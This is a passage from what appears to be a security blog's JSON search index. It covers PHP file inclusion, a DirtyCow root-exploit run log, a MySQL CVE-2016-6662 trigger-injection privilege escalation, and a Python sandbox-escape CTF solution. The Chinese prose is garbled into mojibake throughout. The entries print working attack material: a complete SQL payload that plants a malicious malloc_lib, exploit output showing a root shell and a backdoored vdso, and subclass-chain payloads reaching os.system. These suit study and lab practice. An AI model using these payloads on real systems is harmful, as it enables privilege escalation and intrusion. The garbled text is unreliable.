ÊÄªÁªìÊÄª‰ΩìÊù•ËØ¥ÔºåÁõ¥Êé•ÂèØ‰ª•grepÂà∞$_GET„ÄÅ$_POST„ÄÅ$_REQUESTÁöÑcmsÔºåÂÆ°ËÆ°Ëµ∑Êù•‰ºöÊØîËæÉËΩªÊùæ„ÄÇÂèØ‰ª•ÂÖà‰ªéÂÖ•Âè£ÁúãËµ∑ÔºåÂ∞Ücommon,configÁ≠âÊñá‰ª∂Áúã‰∏ÄÈÅçÔºåÂÜçÊü•ÊâæÂç±Èô©ÂáΩÊï∞ÔºåÊï∞ÊçÆÂÖ•Âè£Â∞±ÂèØÂÆ°ËÆ°Âá∫Âá†‰∏™ÊºèÊ¥ûÊù•„ÄÇbluecmsÊöÇÊó∂ÂÆ°ËÆ°Âà∞Ëøô‰∏ÄÊ≠•Ôºå‰∏ªË¶ÅÊâæÁöÑÊòØSQLÊ≥®ÂÖ•ÁöÑÊºèÊ¥û„ÄÇÂÖ∂‰ªñÊºèÊ¥ûÊâìÁÆóÂáÜÂ§áÂè¶Â§ñ‰∏ÄÂ•ócmsÊù•ÂÆ°ËÆ°:)"},{"title":"„ÄêVULNERABLITY„ÄëÊñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûËØ¶Ëß£","permalink":"http://blog.0kami.cn/2016/12/19/old-old-file-include/","text":"Ê¶ÇËø∞Âæà‰πÖÊ≤°ÊúâÂΩíÁ∫≥ÊÄªÁªìÁü•ËØÜÁÇπ‰∫ÜÔºåÂ≠¶‰∫ÜÈÇ£‰πàÂ§öÊÄªÊÑüËßâÈÇ£‰πàÈõ∂Êï£ÔºåÊâÄ‰ª•ÂáÜÂ§áÂºÄÂßãÊÄªÁªìËøô‰∏ÄÁ≥ªÂàóÁöÑÊºèÊ¥ûËØ¶Ëß£„ÄÇ‰∏ÄÊñπÈù¢ÊòØÊÄªÁªì‰∏ÄÊñπÈù¢‰πüÊòØÂ§ç‰π†„ÄÇËøôÁØá‰∏ªË¶ÅÊÄªÁªì‰∏Ä‰∏ãÊñá‰ª∂ÂåÖÂê´ÊºèÊ¥û„ÄÇ Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûÁî±‰∫éÂú®WebÂ∫îÁî®ÂºÄÂèëÁöÑËøáÁ®ã‰∏≠ÔºåÂ§ßÈáè‰ª£Á†ÅÊòØÂèØ‰ª•ÈáçÂ§ç‰ΩøÁî®ÁöÑÔºå‰∏∫‰∫ÜÊñπ‰æø‰ΩøÁî®ÁªìÂêàÂºÄÂèëËØ≠Ë®Ä(Â¶Çphp)ÁöÑ‰æøÂà©ÔºåÂåÖÂê´ÈáçÂ§çÂà©Áî®ÁöÑ‰ª£Á†ÅÔºåÂ¶ÇÊûúÂú®ÂåÖÂê´ËøáÁ®ã‰∏≠ÔºåË∑ØÂæÑÊàñËØ∑Ê±ÇÁöÑurlÂèØÊéß‰∏îÊ≤°ÊúâÂÅö‰ªª‰ΩïÁöÑÂÆâÂÖ®Â§ÑÁêÜÔºåÂ∞±ÂÆπÊòìÂèëÁîüÊñá‰ª∂ÂåÖÂê´ÊºèÊ¥û„ÄÇÊñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûÂåÖÊã¨ Êú¨Âú∞Êñá‰ª∂ÂåÖÂê´ ËøúÁ®ãÊñá‰ª∂ÂåÖÂê´ ‰∏ãÈù¢‰∏ªË¶ÅËÆ≤ÁöÑÊñá‰ª∂ÂåÖÂê´Âú®php‰∏≠ÁöÑÂ∫îÁî®ÔºåÊØïÁ´üphpÊòØ‰∏ñÁïå‰∏äÊúÄÂ•ΩÁöÑËØ≠Ë®ÄÔºå23333333ps:ÂÖ∂‰ªñËØ≠Ë®ÄÔºåÈÅáÂà∞‰∫ÜÂÜçË°•ÂÖÖ ËøúÁ®ãÊñá‰ª∂ÂåÖÂê´ËøôÈáåÂÖàËÆ≤‰∏Ä‰∏ãËøúÁ®ãÊñá‰ª∂ÂåÖÂê´RFIÔºàRemote File IncludeÔºâÔºåÈ°æÂêçÊÄù‰πâÔºåËøúÁ®ãÊñá‰ª∂ÂåÖÂê´Â∞±ÊòØÔºåWebÂ∫îÁî®Á®ãÂ∫èËØ∑Ê±ÇËøúÁ®ãÁöÑËµÑÊ∫êÔºåËøõË°å‰∏Ä‰∏™ÂåÖÂê´Âà©Áî®„ÄÇ‰∏Ä‰∫õÁå•ÁêêÁöÑËøáÈ©¨‰∏ÄÂè•ËØùÊú®È©¨Â∞±ÊòØÂà©Áî®ËøôÁßçÊñπÂºèËøõË°å‰∏Ä‰∏™ÊÅ∂ÊÑè‰ª£Á†ÅÁöÑÂåÖÂê´„ÄÇÂú®php‰∏≠ÈÄ†ÊàêËøúÁ®ãÊñá‰ª∂ÂåÖÂê´ÔºåÈ¶ñÂÖàÈúÄË¶ÅÈÖçÁΩÆÊñá‰ª∂‰∏≠allow_url_include=OnÈªòËÆ§‰∏çÂºÄÂêØÔºå‰ª•ÂèäËøúÁ®ãËØªÂèñÊñá‰ª∂allow_url_fopen=OnÔºåÊª°Ë∂≥Ëøô‰∫õÊù°‰ª∂ÔºåÊàë‰ª¨ÂÜçÊù•ÁúãÁúãÊúâÂì™‰∫õËß¶ÂèëËøúÁ®ãÊñá‰ª∂ÂåÖÂê´ÁöÑphpÂáΩÊï∞„ÄÇ12345678910//ËØªÂèñËøúÁ®ãÊñá‰ª∂ÂÜÖÂÆπfopen()copy()file_get_content()//ÂåÖÂê´ËøúÁ®ãÊñá‰ª∂‰ª£Á†Åinclude()include_once()require()require_once()//ÂèØËÉΩ‰ºöÊúâÈÅóÊºèÔºåÂ∞è‰ºô‰º¥Â¶ÇÊûúÁü•ÈÅìËøòÊúâÂÖ∂‰ªñÁöÑÂèØ‰ª•emailÊàëÔºöÔºâ ÂâçÈù¢ËØªÂèñËøúÁ®ãÊñá‰ª∂ÂÜÖÂÆπÔºåÂèØËÉΩ‰ºöÂá∫Áé∞Âú®‰∏ä‰º†Â§¥ÂÉèÂ§ÑÔºåÂ≠òÂèñËøúÁ®ãÂ§¥ÂÉè„ÄÇÂêéËÄÖÂç±ÂÆ≥ÂèØËÉΩÊõ¥Â§ßÔºåÁõ¥Êé•ÂåÖÂê´ÊÅ∂ÊÑè‰ª£Á†ÅÊâßË°åÂØºËá¥‰ªªÊÑè‰ª£Á†ÅÊâßË°å„ÄÇ ËøúÁ®ãÂåÖÂê´ÊîØÊåÅÁöÑÂçèËÆÆÂú®Êª°Ë∂≥ÈÖçÁΩÆÊñá‰ª∂ÁöÑË¶ÅÊ±Ç‰∏ãÔºå‰ΩøÁî®phpÊîØÊåÅ‰ΩøÁî®http„ÄÅhttps(Â≠òÂú®opensslÊâ©Â±ïÊó∂)„ÄÅftp„ÄÅphp://input„ÄÅ"},{"title":"„ÄêCVE-2016-5195„ÄëDirtycow","permalink":"http://blog.0kami.cn/2016/10/26/old-old-dirtycow-cve-2016-5195/","text":"Ê¶ÇËø∞ÊúÄËøëÂá∫Êù•ÁöÑdirtycowÔºåÂΩ±ÂìçÁâàÊú¨:Linux kernel &gt;= 2.6.22Ôºà2007Âπ¥ÂèëË°åÔºåÂà∞‰ªäÂπ¥10Êúà18Êó•Êâç‰øÆÂ§çÔºâ,Áî®ÁΩë‰∏äÁöÑEXPËØï‰∫Ü‰∏Ä‰∏ãÔºåËÆ∞ÂΩï‰∏Ä‰∏ãËøáÁ®ã EXPhttps://www.exploit-db.com/exploits/40616/Ëøô‰∏™EXPÊòØexploitdb‰∏äÁöÑÔºå‰ΩÜÊòØÂÆπÊòìÈÄ†ÊàêÁ≥ªÁªüÂ¥©Ê∫ÉÔºåÊàêÂäüÂêé‰ºöËøîÂõû‰∏Ä‰∏™rootÊùÉÈôêÁöÑshell 123456789101112131415okami@ubuntu14:~$ ./dirtycowDirtyCow root privilege escalationBacking up /usr/bin/passwd.. to /tmp/bakSize of binary: 47032Racing, this may take a while..thread stoppedthread stopped/usr/bin/passwd is overwrittenPopping root shell.Don&apos;t forget to restore /tmp/bakroot@ubuntu14:/home/okami# iduid=0(root) gid=1000(okami) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(okami)root@ubuntu14:/home/okami# whoamirootroot@ubuntu14:/home/okami# https://github.com/scumjr/dirtycow-vdsoËøô‰∏™EXP‰∏ç‰ºöÂá∫Áé∞Á≥ªÁªüÂ¥©Ê∫ÉÔºå‰ΩÜÊòØ‰ΩúËÄÖÊú¨‰∫∫ËØ¥‰∏çÈÄÇÁî®‰∫éÊâÄÊúâlinuxÁâàÊú¨Ôºå‰∏çËøáËØïÈ™å‰∫Ü‰∏Ä‰∏ãÔºåubuntu14 16 centOS7ÈÉΩÂèØ‰ª•123456789101112131415161718192021okami@ubuntu14:~$ ./0xdeadbeef[*] exploit: patch 1/2[*] vdso successfully backdoored[*] exploit: patch 2/2[*] vdso successfully backdoored[*] waiting for reverse connect shell...[*] enjoy![*] restore: patch 2/2[*] vdso successfully restored[*] restore: patch 1/2[*] vdso successfully restorediduid=0(root) gid=0(root) groups=0(root)whoamirootlsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription: Ubuntu 14.04.5 LTSRelease: 14.04Codename: trusty Ê≥®ÊÑèËøôÈáåÊúâ‰∏ÄÊ≠•ÊòØwaiting for reverse connect shell‚Ä¶ÔºåÈúÄË¶Å‰∏ÄÁÇπÊó∂Èó¥ÔºåÊàêÂäüÂêéÊúârootÊùÉÈôêÁöÑshell"},{"title":"„ÄêCVE-2016-6662„ÄëMYSQLÊèêÊùÉÂàÜÊûê","permalink":"http://blog.0kami.cn/2016/09/18/old-old-cve-2016-6663-mysql-exp/","text":"Ê¶ÇËø∞Âá†Â§©ÂâçÂá∫‰∫ÜmysqlÊú¨Âú∞ÊèêÊùÉÁöÑ0dayÔºåËôΩÁÑ∂Áé∞Âú®ÂÆòÊñπÂ∑≤ÁªèÂá∫‰∫ÜË°•‰∏ÅÔºå‰ΩÜÊòØÂèóÂΩ±ÂìçÁöÑ‰∏ªÊú∫ËøòÊòØÊå∫Â§öÁöÑ„ÄÇË∑üËøõÊìç‰Ωú‰∏ÄÈÅçÔºöÔºâ ÊºèÊ¥ûÂΩ±Âìç1234567MySQL &lt;= 5.7.15 ËøúÁ®ã‰ª£Á†ÅÊâßË°å/ ÊèêÊùÉ (0day) 5.6.33 5.5.52MysqlÂàÜÊîØÁöÑÁâàÊú¨‰πüÂèóÂΩ±Âìç,ÂåÖÊã¨Ôºö MariaDB PerconaDB ÂÆûÈ™åÂàÜÊûêËøôÊ¨°ÂÆûÈ™å‰∏ªË¶Å‰ΩøÁî®dockerÊê≠Âª∫ÁéØÂ¢ÉÔºåÊúâÈúÄË¶ÅÁöÑÂêåÂ≠¶ÂèØ‰ª•pullÊàëÁöÑÂ∫ìÁé©0kami/vulenv:cve-2016-6663ÂÆûÈ™å‰∏ªË¶Å‰ªéattackerÁöÑËßíÂ∫¶ÂÖ•ÊâãÔºåÈ¢ÑÂÖàÊã•ÊúâÁöÑÊùÉÈôêÔºö1234mysql Ë¥¶Êà∑Êã•ÊúâfileÊùÉÈôê bob/bobexp mysql_hookandroot_lib.cmysql-server-5.6my.cnfÂèØË¢´mysqlÁªÑÊîπÂÜôÂÜô ÂÖàÊü•Áúã‰∏Ä‰∏ãÁâàÊú¨‰ø°ÊÅØÂ∞Ü/etc/mysql/my.cnfÊùÉÈôê‰øÆÊîπÊéâÂàõÂª∫bobÁî®Êà∑ÔºåÂπ∂Ëµã‰∫àfileÔºåselectÔºåinsertÊùÉÈôêÔºåÂàõÂª∫Áî®‰∫éÂÆûÈ™åÁöÑÊï∞ÊçÆÂ∫ìactivedbÂíåË°®active_tableÂ∞ÜexpÂÖàÂÜôÂÖ•tmpÁõÆÂΩïÔºåÂπ∂ÁºñËØëÊàêsoÊñá‰ª∂ÔºåÈúÄË¶Å‰øÆÊîπ‰∏Ä‰∏ãipÔºåportÂíåmy.cnfÁöÑ‰ΩçÁΩÆgcc -Wall -fPIC -shared -o mysql_hookandroot_lib.c.so mysql_hookandroot_lib.c.c -ldlÊúÄÂêé‰∏ÄÊ≠•Â∞±ÊòØÂáÜÂ§á‰∏Ä‰∏ãactive_tableÁöÑËß¶ÂèëÂô®‰∫ÜÔºåÊàë‰ª¨ÂèØ‰ª•Áé∞Âú®Ëá™Â∑±ÁîµËÑë‰∏ärootÁî®Êà∑ÊùÉÈôê‰∏ãÁîüÊàê‰∏Ä‰∏™traggerÂú®activedbÊï∞ÊçÆ‰∏ã‰ºöÁîüÊàê‰∏Ä‰∏™Ëß¶ÂèëÂô®Âà∞Ê≠§‰ΩçÁΩÆÊàë‰ª¨ÊâÄÊúâÁöÑÂáÜÂ§áÂ∑•‰ΩúÈÉΩÂÅöÂ•Ω‰∫Ü„ÄÇËÆ©Êàë‰ª¨Áî®bobÁî®Êà∑Êù•Âºπ‰∏™shellÂêß1select &quot;TYPE=TRIGGERS\\ntriggers=&apos;CREATE DEFINER=`root`@`localhost` TRIGGER active_table\\nAFTER INSERT\\n ON `active_table` FOR EACH ROW\\nBEGIN\\n DECLARE void varchar(550);\\n set global general_log_file=\\\\\\&apos;/etc/mysql/my.cnf\\\\\\&apos;;\\n set global general_log = on;\\n select \\&quot;\\n[mysqld]\\nmalloc_lib=\\\\\\&apos;/tmp/mysql_hookandroot_lib.so\\\\\\&apos;\\n\\&quot; INTO void; \\n set global general_log = off;\\nEND&apos;\\nsql_modes=1073741824\\ndefiners=&apos;root@localhost&apos;\\nclient_cs_names=&apos;latin1&apos;\\nconnection_cl_names=&apos;latin1_swedish_ci&apos;\\ndb_cl_names=&apos;latin1_swedish_ci&apos;&quot; into dumpfile &apos;/var/lib/mysql/activedb/active_table.TRG&apos;; Áî®bobÁöÑÁî®Êà∑ÂÜôÂÖ•Êñá‰ª∂‰∫ßÁîü‰∏Ä‰∏™Ëß¶ÂèëÂô®ÔºåËøô‰∏™Ëß¶ÂèëÂô®ÂΩì‰∫ßÁîüinsertÊó∂Ëß¶ÂèëÊù•Êü•Áúã‰∏Ä‰∏ãÔºåÊâßË°åÂêéÁöÑ/etc/mysql/my.cnfÁöÑÂÜÖÂÆπÈáçÂêØ‰∏Ä‰∏ãÊï∞ÊçÆÂ∫ìÔºåÂèçÂºπ‰∏Ä‰∏™shellÂèëÁé∞ÂèØÂÜôÁöÑmy.cnf‰ºöË¢´ÂøΩÁï•ÔºüÔºüÔºü‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πàÔºàÈöæÈÅìÊâìË°•‰∏Å‰∫ÜÔºüÔºâÔºå‰∏çÁü•ÈÅì5.5ÁöÑÊÉÖÂÜµ‰ºöÊÄé‰πàÊ†∑ÔºåÊâÄ‰ª•ÂÖàÊäämy.cnfÁöÑÊùÉÈôêÊîπÂõûÊù•744ÊàêÂäüÂèçÂºπ‰∏Ä‰∏™shellÔºåËøôËæπËøîÂõûÁöÑ‰∏Ä‰∏™shellÊòØmysqlÊùÉÈôêÁöÑ ÊòØÂõ†‰∏∫ÊàëÊµãËØïÁöÑÁéØÂ¢Émysqld_safeÊòØ‰ª•mysqlÊùÉÈôêËøêË°åÁöÑÔºåÊâÄ‰ª•ÂºπÂá∫Êù•ÁöÑÊùÉÈôêÊòØmysqlÁöÑÔºå‰ΩÜÊòØÂ¶ÇÊûúmysqld_safeÊòØ‰ª•rootÊùÉÈôêËøêË°åÔºåÈÇ£‰πàÂèçÂºπÁöÑshellÂ∞±ÊòØrootÊùÉÈôêÁöÑÔºåÈÄ†ÊàêÊèêÊùÉ„ÄÇ ÊÄªÁªìÊµãËØïÁéØÂ¢ÉÊê≠Âª∫ËøòÊúâÂà©Áî®ËøáÁ®ãËøòÊòØÂá∫Áé∞‰∫ÜÂæàÂ§öÈóÆÈ¢òÔºåÂèØÂÜôÁöÑmy.cnf‰ºöË¢´ÂøΩÁï•ËΩΩÂÖ•Ôºà‰∏çÁü•ÈÅìÊòØ‰∏çÊòØÂõ†‰∏∫‰øÆÂ§çËøáÁöÑÂéüÂõ†ÔºâÔºåtriggersÁöÑÂà©Áî®ÔºàÂèØ‰ª•ÂêåÊ†∑Âà©Áî®Âú®Êã•ÊúâfileÊùÉÈôêÁöÑÊÉÖÂÜµ‰∏ãÊèêÂçáÊùÉÈôêÔºåËøô‰∏™Âà∞Êó∂ÂÄôÂÜçÊ∑±ÂÖ•Â≠¶‰π†‰∏Ä‰∏ãÔºâ"},{"title":"„ÄêVULNERABLITY„Äëpython sandbox escape","permalink":"http://blog.0kami.cn/2016/09/16/old-old-python-sandbox-escape/","text":"Ê¶ÇËø∞ÂâçÂá†Â§©ÁöÑÂçéÂ±±ÊùØÂá∫‰∫Ü‰∏ÄÈÅìpythonÁöÑÊ≤ôÁõíÈÄÉÈÄ∏ÔºåÊÑüËßâÊå∫ÊúâÊÑèÊÄùÁöÑ„ÄÇÂú®ÁΩë‰∏äÊêúÁ¥¢‰∫Ü‰∏Ä‰∏ãÔºåÂèëÁé∞ÂæàÊó©Â∞±Âá∫ËøáËøôÁßçÁ±ªÂûãÁöÑÈ¢òÔºåÊ∫êÁ†ÅÈÉΩÂ∑Æ‰∏çÂ§ö„ÄÇÂ≠¶‰π†‰∫Ü‰∏Ä‰∏ãÊÄùË∑ØÔºåËøôÈáåÊÄªÁªì‰∏Ä‰∏ãÔºöÔºâ ‰ªãÁªçÊ≤ôÁõíÊ∫êÁ†ÅÂ¶Ç‰∏ãÔºö123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env pythonfrom __future__ import print_functionprint(\"Welcome to my Python sandbox! Enter commands below!\")banned = [ \"import\", \"exec\", \"eval\", \"pickle\", \"os\", \"subprocess\", \"kevin sucks\", \"input\", \"banned\", \"cry sum more\", \"sys\"]targets = __builtins__.__dict__.keys() targets.remove('raw_input') targets.remove('print') for x in targets:# ÂéªÈô§ÊâÄÊúâÂÜÖÁΩÆÂáΩÊï∞Èô§print raw_input del __builtins__.__dict__[x]while 1: print(\"&gt;&gt;&gt;\", end=' ') data = raw_input() for no in banned: if no.lower() in data.lower(): print(\"No bueno\") break else: # this means nobreak exec data ‰∏çËÉΩÂá∫Áé∞bannedÂàóË°®‰∏≠ÁöÑÂ≠óÁ¨¶Ôºå‰ΩÜÊòØÈúÄË¶ÅËØªÂèñflagÊñá‰ª∂ÂÜÖÂÆπ„ÄÇ ÂéüÁêÜÁªïËøáÂâçÈù¢ÁöÑÈôêÂà∂ÔºåÊàë‰ª¨Êù•‰∏ÄÊ≠•‰∏ÄÊ≠•Áúãpayload ÊñπÊ≥ï‰∏Ä123456&gt;&gt;&gt; [].__class__&lt;type &apos;list&apos;&gt;&gt;&gt;&gt; &#123;&#125;.__class__&lt;type &apos;dict&apos;&gt;&gt;&gt;&gt; ().__class__&lt;type &apos;tuple&apos;&gt; È¶ñÂÖàpythonÁöÑÂÜÖÁΩÆÂØπË±°Êúâ‰∏Ä‰∏™classÂ±ûÊÄßÊù•Â≠òÂÇ®Á±ªÂûãÔºåÊàë‰ª¨ÂæÄ‰∏äÊâæ‰ªñÁöÑÁà∂Á±ª‰ΩøÁî®baseÂ±ûÊÄß123456&gt;&gt;&gt; &#123;&#125;.__class__.__base__&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; ().__class__.__base__&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; [].__class__.__base__&lt;type &apos;object&apos;&gt; ÂèØ‰ª•ÁúãÂà∞ËøîÂõûobjectÂØπË±°ÔºåÂõ†‰∏∫python‰∏≠‰∏ÄÂàáÂùá‰∏∫ÂØπË±°ÔºåÂùáÁªßÊâøobjectÂØπË±°ÔºåÂæóÂà∞object‰πãÂêéÊàë‰ª¨Â∞±ÂèØÂú®ÈÄöËøáÂ±ûÊÄßsubclassesÊù•Êü•ÁúãobjectÁöÑÂ≠êÁ±ªÔºàÂåÖÊã¨ÊâÄÊúâÁöÑÂÜÖÁΩÆÁ±ªÔºâ12&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;] ÂõûÂà∞Êàë‰ª¨ÁöÑ‰∏ªË¶ÅÁõÆÁöÑ‰∏äÔºåÊàë‰ª¨ÈúÄË¶ÅËØªÂèñflagÊñá‰ª∂‰∏≠ÁöÑÂÜÖÂÆπÔºåÂú®Ëøô‰∫õÂ≠êÁ±ª‰∏≠ÊúâÂì™‰∫õÊòØÂèØ‰ª•Áî®Êù•ËØªÂèñÊñá‰ª∂ÂÜÖÂÆπÁöÑÂë¢ÔºüÁ≠îÊ°àÊòØfileÂ≠êÁ±ªÔºåÈ¶ñÂÖàÊü•Êâæ‰∏Ä‰∏ãfileÂ≠êÁ±ªÁöÑ‰ΩçÁΩÆ„ÄÇ12&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(file)40 ËøôÊ†∑Êàë‰ª¨Â∞±ÂèØ‰ª•ÈÄöËøáËøô‰∏™Êù•Âª∫Á´ã‰∏Ä‰∏™fileÁ±ªÁöÑÂà´ÂêçËØªÊñá‰ª∂Âï¶ÔºöÔºâ12&gt;&gt;&gt; f=[].__class__.__base__.__subclasses__()[40]&gt;&gt;&gt; f(&apos;./flag.txt&apos;).read() ÔºüÔºüÔºüÊ≤°Êúâ‰ªª‰ΩïÂÜÖÂÆπÊâìÂç∞Âá∫Êù•Ôºå‰ΩÜÊòØ‰ªñÊ≤°ÊúâÊä•ÈîôËØ¥ÊòéÂ≠òÂú®flag.txtÊñá‰ª∂ÔºåÊàë‰ª¨Â∞ùËØïÁî®‰ªñÁªôÁöÑprintÂáΩÊï∞Êù•ÊâìÂç∞12&gt;&gt;&gt; print(f(&apos;./flag.txt&apos;).read())This is a Flag&#123;enjoy_yourself_ctfer&#125; ÂæóÂà∞flag ÊñπÊ≥ï‰∫åÂêåÊ†∑ÁöÑËøòÊúâ‰∏ÄÁßçÊñπÊ≥ïÂ∞±ÊòØ‰ΩøÁî®osÊ®°ÂùóÊù•ÊâßË°åÁ≥ªÁªüÂëΩ‰ª§systemÔºå‰ΩÜÊòØosË¢´Â±èËîΩ12&gt;&gt;&gt; import osNo bueno Êàë‰ª¨ÂæóÊÉ≥ÂÖ∂‰ªñÂäûÊ≥ïÊù•Ëé∑Âèñshell„ÄÇÈÄöËøá‰∏äÈù¢ÁöÑÊÄùË∑ØÔºåÊàë‰ª¨ÈúÄË¶ÅÊâæ‰∏Ä‰∏™Â≠êÁ±ª‰ªñËÉΩË∞ÉÁî®osÊ®°ÂùóÔºåËøôÈáåÁî®Âà∞‰∫Üwarnings.catch_warningsÁ±ª1234567&gt;&gt;&gt; import warnings&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)59&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59]&lt;class &apos;warnings.catch_warnings&apos;&gt;&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()[&apos;filterwarnings&apos;, &apos;once_registry&apos;, &apos;WarningMessage&apos;, &apos;_show_warning&apos;, &apos;filters&apos;, &apos;_setoption&apos;, &apos;showwarning&apos;, &apos;__all__&apos;, &apos;onceregistry&apos;, &apos;__package__&apos;, &apos;simplefilter&apos;, &apos;default_action&apos;, &apos;_getcategory&apos;, &apos;__builtins__&apos;, &apos;catch_warnings&apos;, &apos;__file__&apos;, &apos;warnpy3k&apos;, &apos;sys&apos;, &apos;__name__&apos;, &apos;warn_explicit&apos;, &apos;types&apos;, &apos;warn&apos;, &apos;_processoptions&apos;, &apos;defaultaction&apos;, &apos;__doc__&apos;, &apos;linecache&apos;, &apos;_OptionError&apos;, &apos;resetwarnings&apos;, &apos;formatwarning&apos;, &apos;_getaction&apos;] Êé•‰∏ãÊù•ÂÜçÊâælinecache1234&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys().index(&apos;linecache&apos;)25&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.keys()[&apos;updatecache&apos;, &apos;clearcache&apos;, &apos;__all__&apos;, &apos;__builtins__&apos;, &apos;__file__&apos;, &apos;cache&apos;, &apos;checkcache&apos;, &apos;getline&apos;, &apos;__package__&apos;, &apos;sys&apos;, &apos;getlines&apos;, &apos;__name__&apos;, &apos;os&apos;, &apos;__doc__&apos;] ÂèØ‰ª•ÁúãÂà∞ËøôÈáåÂèØ‰ª•Ë∞ÉÁî®osÊ®°ÂùóÔºåÊé•‰∏ãÊù•Â∞±Ë∞ÉÁî®systemÂáΩÊï∞‰∫Ü1234&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12]&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.keys().index(&apos;system&apos;)144 Êï¥ÁêÜ‰∏Ä‰∏ã123456789101112&gt;&gt;&gt; a=[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12]&gt;&gt;&gt; a&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;&gt;&gt;&gt; s=a.__dict__.keys().index(&apos;system&apos;)&gt;&gt;&gt; s144&gt;&gt;&gt; s=a.__dict__.keys()[144]&gt;&gt;&gt; s&apos;system&apos;&gt;&gt;&gt; s=a.__dict__.values()[144]&gt;&gt;&gt; s(&apos;pwd&apos;)/home/xxxx/Desktop/code/python-code/test Â•Ω‰∫ÜÁé∞Âú®ÂèØ‰ª•ÊâßË°åÁ≥ªÁªüÂëΩ‰ª§‰∫ÜÔºåcat‰∏Ä‰∏ãflag12&gt;&gt;&gt; s(&apos;cat flag.txt&apos;)This is a Flag&#123;enjoy_yourself_ctfer&#125; 